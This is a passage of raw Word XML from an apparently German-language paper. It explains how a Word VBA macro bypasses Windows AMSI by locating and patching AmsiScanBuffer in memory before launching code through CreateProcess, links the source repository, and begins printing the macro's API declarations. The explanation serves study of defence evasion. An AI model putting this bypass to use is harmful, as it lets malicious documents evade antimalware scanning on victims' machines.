        </w:rPr>
        <w:t xml:space="preserve"> abgezogen. Bei Abzug von 256 erhält man die Startadresse von </w:t>
      </w:r>
      <w:r w:rsidR="00CF65C4" w:rsidRPr="00CF65C4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>AmsiScanBuffer</w:t>
      </w:r>
      <w:r w:rsidR="00CF65C4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="0046002F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Diese Idee wurde aber schlussendlich überworfen und die zu patchenden Adressen dynamisch bestimmt. </w:t>
      </w:r>
      <w:r w:rsidR="0046002F" w:rsidRPr="0046002F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um einen Puffer von Bytes aus dem Speicher zu erhalten, wir </w:t>
      </w:r>
      <w:r w:rsidR="0017666F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">das </w:t>
      </w:r>
      <w:r w:rsidR="0046002F" w:rsidRPr="0046002F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Offset von AmsiUacInitialize </w:t>
      </w:r>
      <w:r w:rsidR="0017666F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">genommen </w:t>
      </w:r>
      <w:r w:rsidR="0046002F" w:rsidRPr="0046002F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">und </w:t>
      </w:r>
      <w:r w:rsidR="0017666F" w:rsidRPr="0017666F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>352</w:t>
      </w:r>
      <w:r w:rsidR="0017666F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Bytes </w:t>
      </w:r>
      <w:r w:rsidR="00E63E65" w:rsidRPr="0046002F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>rückwärts</w:t>
      </w:r>
      <w:r w:rsidR="00E63E65">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidR="00E63E65" w:rsidRPr="0046002F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00E63E65">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>gangen</w:t>
      </w:r>
      <w:r w:rsidR="0017666F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00E07243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E07243" w:rsidRPr="00E07243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Von diesem Ausgangspunkt aus wird dann byteweise um 352 Stellen vorwärts inkrementiert und in einen </w:t>
      </w:r>
      <w:r w:rsidR="00906A31">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="00E07243" w:rsidRPr="00E07243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>uffer eingefügt</w:t>
      </w:r>
      <w:r w:rsidR="00AB5E9E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00AB5E9E" w:rsidRPr="00AB5E9E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>LeakedBytesBuffer</w:t>
      </w:r>
      <w:r w:rsidR="00AB5E9E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00E07243" w:rsidRPr="00E07243">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="007F5FE5">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Anschließend wird der Buffer </w:t>
      </w:r>
      <w:r w:rsidR="00906A31">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>verglichen</w:t>
      </w:r>
      <w:r w:rsidR="00402284">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Mit der Funktion </w:t>
      </w:r>
      <w:r w:rsidR="003F4B50" w:rsidRPr="003F4B50">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>InStr</w:t>
      </w:r>
      <w:r w:rsidR="003F4B50">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> können </w:t>
      </w:r>
      <w:r w:rsidR="00621AD7">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r w:rsidR="003F4B50">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wei String</w:t>
      </w:r>
      <w:r w:rsidR="00621AD7">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="003F4B50">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> miteinanderverglichen werden</w:t>
      </w:r>
      <w:r w:rsidR="00417A42">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00621AD7">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">anschließend das </w:t>
      </w:r>
      <w:r w:rsidR="00417A42">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Offset</w:t>
      </w:r>
      <w:r w:rsidR="00EA56F2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> zu den zu patchenden Bereichen berechnet.</w:t>
      </w:r>
      <w:r w:rsidR="00BC4C1B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nachdem das in memory patching vorgenommen wurde</w:t>
      </w:r>
      <w:r w:rsidR="00327F21">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, wird </w:t>
      </w:r>
      <w:r w:rsidR="00327F21" w:rsidRPr="00327F21">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>CreateProcess</w:t>
      </w:r>
      <w:r w:rsidR="00327F21">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> aufgerufen. Dort kann unser Code platziert werden</w:t>
      </w:r>
      <w:r w:rsidR="00722DD1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Hierbei empfehlen die Autoren </w:t>
      </w:r>
      <w:r w:rsidR="00417A42">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>den Inhalt</w:t>
      </w:r>
      <w:r w:rsidR="00722DD1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00722DD1" w:rsidRPr="00417A42">
        <w:t>base64 zu codieren</w:t>
      </w:r>
      <w:r w:rsidR="00731FF4" w:rsidRPr="00417A42">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="002414D4" w:rsidRPr="00417A42">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#3336d748-bf85-438f-9eb8-46795ce4c9e3"/>
          <w:id w:val="545419254"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="002414D4" w:rsidRPr="00417A42">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="002414D4" w:rsidRPr="00417A42">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002414D4" w:rsidRPr="00417A42">
            <w:t>[5]</w:t>
          </w:r>
          <w:r w:rsidR="002414D4" w:rsidRPr="00417A42">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
    </w:p>
    <w:p w14:paraId="2691E83C" w14:textId="26B072AE" w:rsidR="000E60E5" w:rsidRPr="00417A42" w:rsidRDefault="000E60E5" w:rsidP="0084189E"/>
    <w:p w14:paraId="5A2C570C" w14:textId="05B361E9" w:rsidR="00FB6154" w:rsidRPr="00417A42" w:rsidRDefault="00FB6154" w:rsidP="0084189E">
      <w:r w:rsidRPr="00417A42">
        <w:t>Nachstehend wird der Code de</w:t>
      </w:r>
      <w:r w:rsidR="00FB13CA" w:rsidRPr="00417A42">
        <w:t>s In Memory Patches eingefügt</w:t>
      </w:r>
      <w:r w:rsidR="00BC7DB2" w:rsidRPr="00417A42">
        <w:t xml:space="preserve">, dieser ist unter dem folgenden Github Repositoriy erhältlich: </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r w:rsidR="00BC7DB2" w:rsidRPr="00417A42">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/rmdavy/WordAmsiBypass</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="466E54DA" w14:textId="77777777" w:rsidR="00BC7DB2" w:rsidRPr="007D5F25" w:rsidRDefault="00BC7DB2" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="000E60E5" w14:paraId="7B4483CA" w14:textId="77777777" w:rsidTr="000E60E5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7C84C47A" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C728691" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20A12119" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="607F8D4D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="185CBF48" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3922EDBF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C0781E5" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="170EE8F0" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="320B0240" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B621A87" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DA09F9C" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0617F32D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FD8AE1B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="169C3AD2" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Type PROCESS_INFORMATION</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02894B2E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    hProcess As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6815E2B9" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    hThread As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AA7CA32" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwProcessId As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0204BBBB" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwThreadId As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AA2A710" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Type</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CEFD826" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3843F147" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Private Type STARTUPINFO</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="218C0653" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    cb As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13DB71ED" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    lpReserved As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64AE476B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    lpDesktop As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CF6C82A" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    lpTitle As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7269A322" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwX As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59A4522D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwY As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF167E2" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwXSize As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B2B1348" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwYSize As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E8F8440" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwXCountChars As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62D175F2" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwYCountChars As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18A6B7EF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwFillAttribute As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EEAF855" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    dwFlags As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2745AAAC" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    wShowWindow As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36B16180" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    cbReserved2 As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DF63D3F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    lpReserved2 As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A987A3E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
